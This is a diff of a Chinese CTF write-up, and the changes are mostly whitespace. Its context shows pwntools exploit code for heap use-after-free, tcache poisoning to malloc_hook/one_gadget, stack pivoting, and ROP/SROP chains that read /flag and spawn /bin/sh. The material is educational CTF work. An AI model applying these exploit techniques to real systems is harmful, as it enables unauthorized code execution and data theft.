@@ -136,17 +136,17 @@ uaf 覆盖打印函数为 `system`，内容为 `/bin/sh`。
 
 ```python
 def add(size,content='a'):
-	sla(':','1')
-	sla('size: \n',str(size))
-	sa('content: \n',content)
+    sla(':','1')
+    sla('size: \n',str(size))
+    sa('content: \n',content)
 
 def free(index):
-	sla(':','2')
-	sla('index: \n',str(index))
+    sla(':','2')
+    sla('index: \n',str(index))
 
 def show(index):
-	sla(':','3')
-	sla('index: \n',str(index))
+    sla(':','3')
+    sla('index: \n',str(index))
 
 add(0x20) # 0
 add(0x20) # 1
@@ -164,22 +164,22 @@ show(0)
 
 ```python
 def add(size,content='a'):
-	sla(':','1')
-	sla(':\n',str(size))
-	sa(':\n',content)
+    sla(':','1')
+    sla(':\n',str(size))
+    sa(':\n',content)
 
 def free(index):
-	sla(':','2')
-	sla(':\n',str(index))
+    sla(':','2')
+    sla(':\n',str(index))
 
 def edit(index,content):
-	sla(':','3')
-	sla(':\n',str(index))
-	sa(':\n',content)
+    sla(':','3')
+    sla(':\n',str(index))
+    sa(':\n',content)
 
 def show(index):
-	sla(':','4')
-	sla(':\n',str(index))
+    sla(':','4')
+    sla(':\n',str(index))
 
 add(0x50) # 0
 add(0x40) # 1
@@ -213,6 +213,7 @@ free(7)
 ### borrowstack
 
 用 `leave_ret` 栈迁移到 bss 段，需要注意的是栈从高地址向低地址生长，需要留足够的 `offset` 确保迁移之后填的 payload 不会覆盖到下面的 got 表。我直接把 payload 长度加起来留了一些余量作为 `offset`，实际上这里的 `offset` 甚至可以爆破出来。
+
 ```python
 leave_ret = 0x400699
 bank = 0x601080
@@ -287,9 +288,9 @@ sla(':',str(0x60))
 
 ```python
 for i in range(8):
-	add(i)
+    add(i)
 for i in range(8):
-	free(i)
+    free(i)
 
 dbg()
 edit(7,p64(0x4040c0-0x10))
@@ -339,6 +340,7 @@ sla('size\n',str(0x10))
 ### document
 
 本题存在明显的 uaf 漏洞，关键在于通过逆向弄清结构体的结构：
+
 ```
      -----------------------
     | prev_size | size=0x21 |
@@ -412,7 +414,6 @@ sla('?',str(0x18))
 
 `free` 时指针未置 NULL。先利用 tcache double free 泄露堆地址，随后 tcache 投毒拿到 `tcache_perthread_struct`，修改 `count` 令 tcache 全被填满，再次 `free` 时就会进入 unsorted bin 泄露 libc。接下来依然是覆盖 `malloc_hook` 为 `one_gadget` 以及通过 `realloc` 调整 `rsp`，不过由于环境是 2.27，`one_gadget`、偏移量等等都会会有所不同，unsorted bin 泄露的地址也变成了 `main_arena+96` 而非 `+88`。
 
-
 ```python
 add(0x80) # 0
 add(0x80) # 1
@@ -460,14 +461,14 @@ read = base+libc.sym['read']
 buf = base+libc.sym['_IO_2_1_stderr_']
 
 chain = [
-	# read(0,buf,8)
-	pop_rdi,0,pop2,8,buf,read,
-	# open(buf,0,0)
-	pop_rdi,buf,pop2,0,0,open,
-	# read(3,buf,0x100)
-	pop_rdi,3,pop2,0x100,buf,read,
-	# puts(buf)
-	pop_rdi,buf,puts
+    # read(0,buf,8)
+    pop_rdi,0,pop2,8,buf,read,
+    # open(buf,0,0)
+    pop_rdi,buf,pop2,0,0,open,
+    # read(3,buf,0x100)
+    pop_rdi,3,pop2,0x100,buf,read,
+    # puts(buf)
+    pop_rdi,buf,puts
 ]
 sa('thing:',flat(chain))
 payload = flat('a'*0x70,'a'*8,ret)
@@ -480,7 +481,6 @@ s('/flag\x00\x00\x00')
 看到程序主动调用 `syscall(15,&buf)` 可知是 SROP，我们需要在 `buf` 里放伪造的 Sigreturn Frame，然后程序就会调用 `rt_sigreturn` 恢复我们伪造的 frame。同样开启了沙箱，依然是构造 ORW 读 flag。
 
 这里在使用 `pwnlib.rop.srop` 模块时，用 `SigreturnFrame` 构造时出现了一些问题，暂时还不清楚原因，使用了手动构造 frame 的办法。
-
 
 ```python
 ru('0x')
@@ -510,17 +510,16 @@ frame += p64(0)*7
 sa('message:',frame)
 
 chain = [
-	'/flag\x00\x00\x00',0,
-	# open(buf-0x10,0,0)
-	pop_rdi,buf-0x10,pop2,0,0,open,
-	# read(3,buf+0x100,0x100)
-	pop_rdi,3,pop2,0x100,buf+0x100,read,
-	# puts(buf+0x100)
-	pop_rdi,buf+0x100,puts
+    '/flag\x00\x00\x00',0,
+    # open(buf-0x10,0,0)
+    pop_rdi,buf-0x10,pop2,0,0,open,
+    # read(3,buf+0x100,0x100)
+    pop_rdi,3,pop2,0x100,buf+0x100,read,
+    # puts(buf+0x100)
+    pop_rdi,buf+0x100,puts
 ]
 s(flat(chain))
 ```
-
 
 更新：参考 AiDai 师傅的方法，可以自动构造 frame，并且不需要系统调用：
 
@@ -544,14 +543,14 @@ frame.rip = read
 sa('message:',str(frame)[8:])
 
 chain = [
-	# read(0,buf,0x100)
-	pop_rdi,0,pop2,0x100,buf,read,
-	# open(buf,0,0)
-	pop_rdi,buf,pop2,0,0,open,
-	# read(3,buf,0x100)
-	pop_rdi,3,pop2,0x100,buf,read,
-	# puts(buf)
-	pop_rdi,buf,puts
+    # read(0,buf,0x100)
+    pop_rdi,0,pop2,0x100,buf,read,
+    # open(buf,0,0)
+    pop_rdi,buf,pop2,0,0,open,
+    # read(3,buf,0x100)
+    pop_rdi,3,pop2,0x100,buf,read,
+    # puts(buf)
+    pop_rdi,buf,puts
 ]
 s(flat(chain))
 s('/flag\x00')
